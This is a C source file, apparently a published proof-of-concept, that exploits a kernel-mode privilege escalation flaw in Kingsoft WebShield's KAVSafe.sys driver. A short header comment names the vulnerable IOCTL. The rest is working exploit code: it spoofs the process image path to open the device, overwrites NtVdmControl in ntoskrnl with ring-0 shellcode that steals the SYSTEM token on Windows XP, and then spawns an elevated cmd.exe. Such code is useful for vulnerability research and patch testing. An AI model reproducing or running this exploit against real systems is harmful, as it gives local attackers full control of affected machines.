/*
Kingsoft WebShield KAVSafe.sys <= 2010.4.14.609(2010.5.23) Kernel Mode Local Privilege Escalation Vulnerability

VULNERABLE PRODUCTS 
Kingsoft WebShield <= 3.5.1.2 (2010.5.23)

Signature Date: 2010-5-23 2:33:54

And

KAVSafe.sys <= 2010.4.14.609
Signature Date&#65306;2010-4-14 13:42:26

DETAILS:
Kavsafe.sys create a device called \Device\KAVSafe , and handles DeviceIoControl request IoControlCode = 0x830020d4 , which can overwrite arbitrary kernel module data
*/

// EXPLOIT CODE:

#define IOCTL_HOTPATCH_KERNEL_MODULE CTL_CODE(0x8300 , 0x835 , METHOD_BUFFERED ,FILE_ANY_ACCESS)
typedef LONG (WINAPI *PNT_QUERY_INFORMATION_PROCESS)(
  HANDLE ProcessHandle,
  DWORD ProcessInformationClass,
  PVOID ProcessInformation,
  ULONG ProcessInformationLength,
  PULONG ReturnLength
    );

typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
} STRING;
typedef STRING *PSTRING;
typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;
#define RTL_MAX_DRIVE_LETTERS 32
#define RTL_DRIVE_LETTER_VALID (USHORT)0x0001
typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, *PCURDIR;
typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    HANDLE ConsoleHandle;
    ULONG  ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;
    CURDIR CurrentDirectory;        // ProcessParameters
    UNICODE_STRING DllPath;         // ProcessParameters
    UNICODE_STRING ImagePathName;   // ProcessParameters
    UNICODE_STRING CommandLine;     // ProcessParameters
    PVOID Environment;              // NtAllocateVirtualMemory
    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;     // ProcessParameters
    UNICODE_STRING DesktopInfo;     // ProcessParameters
    UNICODE_STRING ShellInfo;       // ProcessParameters
    UNICODE_STRING RuntimeData;     // ProcessParameters
    RTL_DRIVE_LETTER_CURDIR CurrentDirectores[ RTL_MAX_DRIVE_LETTERS ];
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;      // These four fields cannot change unless the
    BOOLEAN ReadImageFileExecOptions;   //
    BOOLEAN BeingDebugged;              //
    BOOLEAN SpareBool;                  //
    HANDLE Mutant;                      // INITIAL_PEB structure is also updated.
    PVOID ImageBaseAddress;
    PVOID Ldr;
    struct _RTL_USER_PROCESS_PARAMETERS *ProcessParameters;
} PEB, *PPEB;
typedef LONG KPRIORITY;
typedef struct _PROCESS_BASIC_INFORMATION {
    LONG ExitStatus;
    PVOID PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION,*PPROCESS_BASIC_INFORMATION;
typedef struct {
    ULONG   Unknown1;
    ULONG   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT  Index;
    USHORT  NameLength;
    USHORT  LoadCount;
    USHORT  PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} X_SYSTEM_MODULE_INFORMATION, *PX_SYSTEM_MODULE_INFORMATION;
typedef LONG (WINAPI *PNT_QUERY_SYSTEM_INFORMATION) (
   LONG SystemInformationClass,
 PVOID SystemInformation,
   ULONG SystemInformationLength,
   PULONG ReturnLength
    );

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
typedef LONG (WINAPI *PNT_VDM_CONTROL) (
   ULONG Service,
   PVOID ServiceData
    );
VOID __declspec(naked) R0ShellCodeXP()
{
__asm
{
mov eax,0xffdff124
mov eax,[eax]
mov esi ,dword ptr[eax+0x220]
mov eax,esi
searchxp:
mov eax,dword ptr[eax+0x88]
sub eax,0x88
mov edx,dword ptr[eax+0x84]
cmp edx,4
jnz searchxp
mov eax,dword ptr[eax+0xc8]
mov dword ptr[esi + 0xc8] , eax
ret 8 
}
}
VOID NopNop()
{
printf("nop!\n");
}

#include "malloc.h"
int main(int argc, char* argv[])
{

printf("KSWebShield KAVSafe.sys <= 2010,04,14,609\n"
"Kernel Mode Privilege Escalation Vulnerability Proof-of-Concept\n"
"2010-5-23\n"
"By Lincoin \n\nPress Enter");
HKEY hkey ; 
WCHAR InstallPath[MAX_PATH];
DWORD datatype ; 
DWORD datasize = MAX_PATH * sizeof(WCHAR);
ULONG oldlen ;
PVOID pOldBufferData = NULL ; 

if (RegOpenKey(HKEY_LOCAL_MACHINE , "SOFTWARE\\Kingsoft\\KSWSVC", &hkey) == ERROR_SUCCESS)
{
if (RegQueryValueExW(hkey , L"ProgramPath" , NULL , &datatype , (LPBYTE)InstallPath , &datasize) != ERROR_SUCCESS)
{
RegCloseKey(hkey);
printf("KSWebShield not installed\n");
getchar();
return 0 ;
}

RegCloseKey(hkey);
}
else
{
printf("KSWebShield not installed\n");
getchar();
return 0 ;
}
wcscat(InstallPath , L"\\kavinst.exe");


PROCESS_BASIC_INFORMATION pbi ; 

PNT_QUERY_INFORMATION_PROCESS pNtQueryInformationProcess ;
pNtQueryInformationProcess = (PNT_QUERY_INFORMATION_PROCESS)GetProcAddress(GetModuleHandle("ntdll.dll" ) , "NtQueryInformationProcess");
pNtQueryInformationProcess(NtCurrentProcess() , 0 , &pbi , sizeof(pbi) , NULL);

PPEB peb ; 

peb = (PPEB)pbi.PebBaseAddress;
oldlen = peb->ProcessParameters->ImagePathName.Length;
peb->ProcessParameters->ImagePathName.Length = wcslen(InstallPath) * sizeof(WCHAR);
pOldBufferData = malloc(peb->ProcessParameters->ImagePathName.Length);
RtlCopyMemory(pOldBufferData,peb->ProcessParameters->ImagePathName.Buffer , peb->ProcessParameters->ImagePathName.Length);
RtlCopyMemory(peb->ProcessParameters->ImagePathName.Buffer , InstallPath ,peb->ProcessParameters->ImagePathName.Length );
HANDLE hdev = CreateFile("\\\\.\\KAVSafe" , 
FILE_READ_ATTRIBUTES , 
FILE_SHARE_READ , 
0,
OPEN_EXISTING , 
0,
0);

if (hdev==INVALID_HANDLE_VALUE)
{
printf("cannot open device %u\n", GetLastError());
getchar();
return 0 ; 
}
RtlCopyMemory(peb->ProcessParameters->ImagePathName.Buffer , pOldBufferData,peb->ProcessParameters->ImagePathName.Length);
peb->ProcessParameters->ImagePathName.Length = (USHORT)oldlen ; 

PNT_QUERY_SYSTEM_INFORMATION pNtQuerySystemInformation  ;
pNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandle("ntdll.dll") , "NtQuerySystemInformation");
X_SYSTEM_MODULE_INFORMATION sysmod ; 
HMODULE KernelHandle ; 

pNtQuerySystemInformation(0xb, &sysmod, sizeof(sysmod), NULL);
    KernelHandle = LoadLibrary(strrchr(sysmod.Module[0].ImageName, '\\') + 1);
if (KernelHandle == 0 )
{
printf("cannot load ntoskrnl!\n");
getchar();
return 0 ; 
}
PVOID pNtVdmControl = GetProcAddress(KernelHandle , "NtVdmControl");

if (pNtVdmControl == 0 )
{
printf("cannot find NtVdmControl!\n");
getchar();
return 0 ; 
}
pNtVdmControl = (PVOID)((ULONG)pNtVdmControl - (ULONG)KernelHandle  );

printf("NtVdmControl = %08x" , pNtVdmControl );
getchar();
ULONG ShellCodeSize = (ULONG)NopNop - (ULONG)R0ShellCodeXP;
ULONG pShellCode = (ULONG)R0ShellCodeXP; 


PVOID Data = malloc(0x48 + ShellCodeSize);

CopyMemory((PVOID)((ULONG)Data + 0x48) , R0ShellCodeXP , ShellCodeSize);
CHAR ModuleName[68]= "ntoskrnl.exe" ; 
RtlCopyMemory( Data , ModuleName , sizeof(ModuleName));
*(ULONG*)((ULONG)Data + 64) = (ULONG)pNtVdmControl;
*(ULONG*)((ULONG)Data + 68) = ShellCodeSize ;
ULONG btr ; 
if (!DeviceIoControl(hdev ,
IOCTL_HOTPATCH_KERNEL_MODULE , 
Data , 
0x48 + ShellCodeSize , 
NULL , 
0,
&btr , 0 
))
{
printf("cannot device io control!%u\n" , GetLastError());
getchar();
return 0;
}

CloseHandle(hdev);

PNT_VDM_CONTROL pR3NtVdmControl = (PNT_VDM_CONTROL)GetProcAddress(GetModuleHandle("ntdll.dll") , "NtVdmControl");
pR3NtVdmControl(0,0);
WinExec("cmd.exe" , SW_SHOW);
printf("OK!\n ");

getchar();

return 0; 
}



      